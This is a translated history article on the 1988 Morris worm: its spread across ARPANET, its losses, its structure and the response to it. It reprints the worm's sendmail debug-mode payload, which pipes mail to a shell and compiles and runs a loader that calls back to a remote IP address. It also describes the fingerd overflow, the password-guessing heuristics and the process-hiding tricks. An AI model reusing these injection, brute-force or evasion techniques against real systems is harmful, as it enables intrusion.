<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Morris worm - he was the first</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="On November 2, 1988, the ARPANET network was attacked by a program that later became known as the ‚ÄúMorris worm‚Äù - after its creator, a student at Corn...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Morris worm - he was the first</h1><div class="post__text post__text-html js-mediator-article">  On November 2, 1988, the ARPANET network was attacked by a program that later became known as the ‚ÄúMorris worm‚Äù - after its creator, a student at Cornell University, Robert Morris Jr.  The ARPANET (Advanced Research Projects Agency Network) was created in 1969 on the initiative of the Defense Advanced Research Projects Agency (DARPA) and was the prototype of the Internet.  This network was created in the interests of researchers in the field of computer technology and technology for exchanging messages, as well as programs and data arrays between the largest research centers, laboratories, universities, government organizations and private firms performing work in the interests of the US Department of Defense (DoD, Department of Defense). of USA).  It was DoD that commissioned one of the three most common transport protocols of the OSI model, called TCP / IP, which in 1983 became the main ARPANET protocol.  By the end of the 80s, the network consisted of several tens of thousands of computers.  ARPANET ceased to exist in June 1990. <br>  The Morris Worm was the first in the history of the development of computing technology a sample of malicious software that used automatic network propagation mechanisms.  To do this, several vulnerabilities of network services were used, as well as some weaknesses of computer systems, due to insufficient attention to security issues at that time. <br><a name="habracut"></a><br>  According to Robert Morris, the worm was created for research purposes.  Its code did not contain any "useful" load (destructive functions).  However, due to the mistakes made in the work algorithms, the spread of the worm triggered the so-called ‚Äúdenial of service‚Äù, when computers were busy making multiple copies of the worm and stopped responding to operator commands.  The Morris worm practically paralyzed computers on the ARPANET for up to five days.  Estimation of downtime - at least 8 million hours and over 1 million hours of time spent on the restoration of systems.  Total losses in monetary terms were estimated at 98 million dollars, they formed their direct and indirect losses. <br>  The direct losses were ($ 32 million): <br>  stop, test and reboot 42700 machines; <br>  worm identification, deletion, memory cleaning and recovery of 6200 machines; <br>  worm code analysis, disassembly and documentation; <br>  UNIX fixes and testing. <br>  The indirect losses were attributed (66 million dollars): <br>  loss of computer time due to lack of access to the network; <br>  loss of user access to the network. <br>  However, these estimates should be treated very, very carefully. <br>  Structurally, the worm consisted of three parts - the "head" and two "tails".  The ‚Äúhead‚Äù was a C source text (99 lines) and compiled directly on a remote machine.  "Tails" were identical, in terms of source code and algorithms, binary files, but compiled for different types of architectures.  According to Morris, VAX and SUN were chosen as the target hardware platforms.  The ‚Äúhead‚Äù was thrown using the following methods: <br><ul><li>  using debug mode in sendmail; </li><li>  exploiting a buffer overflow vulnerability in the fingerd network service; </li><li>  selection of username and password for remote program execution (rexec); </li><li>  call a remote command interpreter (rsh) by selecting a username and password or using a trust mechanism. </li></ul><br>  Sendmail is the oldest network service that handles receiving and sending mail using the SMTP protocol.  At the time of the spread of the worm, Sendmail had an undocumented possibility - the developers had programmed a debugging mode, which should not have been in the working version of the program and was left by mistake.  One of the features of the debug mode was that the email message was not processed by Sendmail itself, but by another program.  An example of an email sent by a worm: <br>  <em>debug</em> <br>  <em>mail from: &lt;/ dev / null&gt;</em> <br>  <em>rcptto: &lt;"| sed-e '1, / ^ $ / d' | / bin / sh; exit 0"&gt;</em> <br>  <em>data</em> <br>  <em>cd / usr / tmp</em> <br>  <em>cat&gt; x14481910.c &lt;&lt; 'EOF'</em> <br>  <em>&lt;program text l1.c&gt;</em> <br>  <em>EOF</em> <br>  <em>cc -o x14481910 x14481910.c;</em>  <em>14481910 128.32.134.16 32341 8712440;</em>  <em>rm -f x14481910 x14481910.c</em> <br>  <em>.</em> <br>  <em>quit</em> <br>  As you can see, the headers were removed from the body of the letter (with the help of the text preprocessor sed) and the source file of the head was saved.  Further, the command processor was given instructions for compiling the ‚Äúhead‚Äù code, running the resulting executable file, and erasing temporary files. <br>  To exploit the vulnerability of the fingerd service, the worm passed a specially prepared string of 536 bytes, which eventually called the execve function ("/ bin / sh", 0, 0).  This worked only for VAX computers with OS 4.3BSD installed, this vulnerability was not present on SUN computers running SunOS. <br>  To use the distribution method through rexec and rsh, a list of users of the local machine was collected.  Based on it, the most frequently used passwords were selected, in the hope that many users have the same names and passwords on all the machines on the network, which, incidentally, was not far from the truth.  In addition to the selection in rsh, a trust mechanism was used, or, according to another simplified authentication mechanism, by the IP address of the remote machine.  These addresses were stored in the /etc/hosts.equiv and .rhosts files.  For most computers, the trust was mutual, so with a high degree of probability, the list of IP addresses from these files found by the worm made it possible to log into the remote system via rsh without using a password at all <br>  When selecting a worm, I tried the following password options: <br><ul><li>  empty; </li><li>  username (user); </li><li>  username, written opposite (resu); </li><li>  double duplicate username (useruser); </li><li>  the user's first or last name (John, Smith); </li><li>  lowercase username or surname (john, smith); </li><li>  built-in dictionary of 432 words; </li><li>  the / usr / dict / words file, containing about 24,000 words and used in the 4.3BSD system (and others) as a spelling dictionary.  If the word begins with a capital letter, then the version with a lowercase letter was also checked. </li></ul><br>  The complex use of several propagation methods greatly influenced the mass distribution of the worm in the network.  To search for remote computers, the network was scanned based on information from the route table and the infected system‚Äôs own IP address. <br>  The worm used several techniques to make it difficult for administrators to discover computers: <br><ul><li>  deleting your executable file after launch; </li><li>  all error messages were disabled, and the size of the crash dump was set to zero; </li><li>  The worm's executable file was saved under the name sh, the same name was used by the Bourne Shell command interpreter, so the worm was masked in the process list; </li><li>  approximately every three minutes a child thread was spawned, and the parent thread terminated, and the worm's pid process was constantly changing and the runtime shown in the process list was reset; </li><li>  all text strings were encoded by applying the operation xor 81h. </li></ul><br>  Despite the ‚Äúgrandeur‚Äù of the idea, the worm had some errors in itself, both in design and implementation.  It is the incorrectly implemented algorithm for checking whether the system is already infected, led to the mass distribution of the worm in the network, contrary to the idea of ‚Äã‚Äãits author.  In practice, computers were infected many times, which, firstly, led to the rapid exhaustion of resources, and secondly, it contributed to the avalanche-like spread of the worm in the network.  According to some estimates, the Morris worm infected about 6,200 computers.  The developer himself, realizing the scale of the results of his act, voluntarily surrendered to the authorities and told everything.  The hearing of his case ended on January 22, 1990.  Initially, Morris was threatened with up to five years in prison and a fine of 25 thousand dollars.  In fact, the sentence was fairly lenient, the court ordered 400 hours of community service, $ 10,000 in fines, a trial period of three years, and payment of expenses related to monitoring a convict. <br>  The incident with the ‚ÄúMorris worm‚Äù forced IT specialists to think seriously about security issues, particularly after that, to increase system security, the use of pauses after incorrectly entering a password and storing passwords in / etc / shadow began to take place, where they were transferred from the readable all users of the / etc / passwd file.  But the most important event was the creation in November 1988 of the CERT Coordination Center (CERT Coordination Center, CERT / CC), whose activities are related to solving Internet security problems.  The first CERT security bulletin that appeared in December 1988 was a report about vulnerabilities used by the worm.  It is noteworthy that many technical solutions used by the ‚ÄúMorris worm‚Äù, such as using brute force passwords, compiling bootloader code on remote computers running * NIX systems (Slapper), scanning the network to identify targets, etc.  applied in modern samples of malicious software. <br>  Interestingly, in the same 1988 well-known programmer Peter Norton spoke rather sharply in print against the very existence of computer viruses, calling them "myth" and comparing the noise around this topic with "stories about crocodiles living in the sewers of New York."  Just two years after Norton‚Äôs announcement in 1990, the first version of the Norton AntiVirus antivirus program was released. <br>  And finally - in 1988, being impressed by the attack of the Morris worm, the American Computer Hardware Association declared November 30 as the International Information Security Day (Computer Security Day), which is celebrated to this day. </div>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <p>Source: <a href="https://habr.com/ru/post/160337/">https://habr.com/ru/post/160337/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../160323/index.html">Some days with Nexus 4</a></li>
<li><a href="../160325/index.html">Energy center with trigeneration: just what is needed in the Russian reality</a></li>
<li><a href="../160327/index.html">Motorola's Portable Wearable Computer</a></li>
<li><a href="../160331/index.html">OECD report: Internet is five orders of magnitude more efficient than telephone networks. No need to stop him from developing!</a></li>
<li><a href="../160335/index.html">Australian scientists will combine a herd of cows in a wireless sensor network</a></li>
<li><a href="../160339/index.html">The six-legged robot moves almost as if it were alive.</a></li>
<li><a href="../160343/index.html">Google bakes lemon pie: Android 5.0 in May 2013</a></li>
<li><a href="../160347/index.html">Crossbrowser CSS3 Reverse Background Animation</a></li>
<li><a href="../160351/index.html">Google is now responsible for the lies of users</a></li>
<li><a href="../160353/index.html">Introducing the Meizu MX2!</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>